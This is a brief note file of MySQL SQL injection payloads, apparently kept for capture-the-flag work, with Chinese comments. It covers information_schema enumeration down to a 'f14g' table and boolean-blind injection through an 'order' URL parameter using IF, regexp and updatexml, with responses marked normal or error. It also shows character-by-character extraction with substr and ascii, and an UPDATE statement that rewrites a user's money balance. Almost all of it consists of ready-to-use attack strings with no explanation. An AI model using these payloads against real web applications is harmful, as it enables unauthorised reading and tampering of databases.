# select based information
select database(); #查选数据库
select group_concat(schema_name) from information_schema.schemata
select schema_name from information_schema.schemata limit 0,1  #查询数据库
select table_name from information_schema.tables where table_schema=database() limit 0,1;  #查询表
select column_name from information_schema.columns where table_name='f14g' limit 0,1;  #查询列

# order by

/?order=IF(1=1,1,(select+1+from+information_schema.tables)) #正常
/?order=IF(1=2,1,(select+1+from+information_schema.tables)) #错误


order=(select+1+regexp+if(1=1,1,0x00)) #正常
order=(select+1+regexp+if(1=2,1,0x00)) #错误

order=updatexml(1,if(1=1,1,user()),1) #正确
order=updatexml(1,if(1=2,1,user()),1) #错误


#------------------------some real promble----------------------------------------------
UPDATE `users` SET  `money`=100 WHERE name='heheda'



if((select substr(user() from 1 for 1)),2,1)

if((select ascii(substr(concat(schema_name),1,1)) from information_schema.schemata limit 1 offset 1)<1,2,1)

mysql

CHARACTER_SETS 
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILD